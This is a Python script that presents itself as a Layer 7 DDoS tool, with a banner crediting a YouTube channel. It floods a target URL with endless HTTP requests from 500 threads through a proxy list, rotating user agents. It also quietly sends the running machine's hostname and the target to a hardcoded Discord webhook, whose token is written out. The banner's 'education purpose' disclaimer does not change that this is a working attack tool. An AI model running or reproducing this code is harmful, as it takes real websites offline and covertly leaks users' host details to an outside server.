#ENCODED BY : ALFAZ
#YOUTUBE    : @alfazinfosec
#bokacoda code copy korbi kor but credit diye dis
#This Tool Created by Alfaz

try:
    import urllib.request, os, threading, time, random, sys
    from discord_webhook import DiscordWebhook
    import socket
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install discord_webhook")
    else:
        ("pip install discord_webhook")

usl = "https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm"
useragents = [
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321",
      "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 YaBrowser/15.6.2311.5029 Safari/537.36",
      "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36",
      "Mozilla/5.0 (iPad; U; CPU OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H8 Safari/6533.18.5",
      "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.2039.US Safari/537.1",
      "Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36",
      "Opera/9.80 (Linux armv6l; Opera TV Store/5599; (SonyBDP/BDV13)) Presto/2.12.362 Version/12.11",
      "Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101 Firefox/17.0",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)",
      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50728)",
      "Mozilla/5.0 (SMART-TV; X11; Linux armv7l) AppleWebKit/537.42 (KHTML, like Gecko) Chromium/25.0.1349.2 Chrome/25.0.1349.2 Safari/537.42",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)",
      "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
      "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 535) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
      "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; BRI/1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",]   
    
class fucker(threading.Thread):
    
    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = { 'User-Agent' : random.choice(useragents) }
        self.Lock = threading.Lock()
        self.proxy = proxy

    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        print("[Alfaz_ddos] Attack [%s]\r"%(self.url))
            
    def run(self):
        global Close, Request, Tot_req
        self.Lock.acquire()
        self.Lock.release()
        while True:
            try:
                self.request()
            except:
                sys.stdout.write("[ALFAZ_DDoS] Attack [%s]\r"%(self.url))
                sys.exit(0)
        sys.exit(0)

class MainLoop():

    def home(self):
        global Close, Request, Tot_req
        print \
("""

\033[31m █████╗ ██╗     ███████╗ █████╗ ███████╗\033[31m
\033[31m██╔══██╗██║     ██╔════╝██╔══██╗╚══███╔╝\033[31m
\033[31m███████║██║     █████╗  ███████║  ███╔╝ \033[31m
\033[31m██╔══██║██║     ██╔══╝  ██╔══██║ ███╔╝\033[31m
\033[31m██║  ██║███████╗██║     ██║  ██║███████╗\033[31m
\033[31m╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝\033[31m

\033[31m██████╗ ██████╗  ██████╗ ███████╗\033[31m
\033[31m██╔══██╗██╔══██╗██╔═══██╗██╔════╝\033[31m
\033[31m██║  ██║██║  ██║██║   ██║███████╗\033[31m
\033[31m██║  ██║██║  ██║██║   ██║╚════██║\033[31m
\033[31m██████╔╝██████╔╝╚██████╔╝███████║\033[31m
\033[31m╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\033[31m
\033[34m---------- DDoS Tool Layer7       (Versoin 1.0) BETA!\033[34m
 -------------  The Tools Maked By ALFAZ
\033[0;34m-----------Youtube Link   https://youtube.com/@alfazinfosec\033[0;34m
\033[0;31m------------Dont Use GOV Site Is Just Education Purpose,⚠️\033[0;31m
\033[0;31m_______***Very Power Full Tools ☠️☠️***\033[0;31m
\033[0;31m***These tools are not complete Is Beta Version***\033[0;31m     
""")
        try:
            url = sys.argv[1]
            hst = socket.gethostname()
            webhook = DiscordWebhook(urls='https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm', content=f'{hst} Has Started Flood To {url}')
            response = webhook.execute()
        except:
            pass
        try:
            file_proxy = str("http.txt")
            in_file = open(file_proxy,"r")
        except:
            in_file = open(file_proxy,"r")
        num_threads = str(500)
        if num_threads == "":
            num_threads = int(500)
        else:
            num_threads = int(num_threads)
        try:
            for i in range(num_threads):
                in_line = in_file.readline()
                fucker(url, i + 1, in_line).start()
                in_line = in_line[:-1]
        except:
            print("Usage: python3 ddos.py https://example.com")
        
if __name__ == '__main__':
    if sys.platform.startswith("linux"):
        os.system("clear")
    else:
        ("cls")
    MainLoop().home()

                                 


                                        
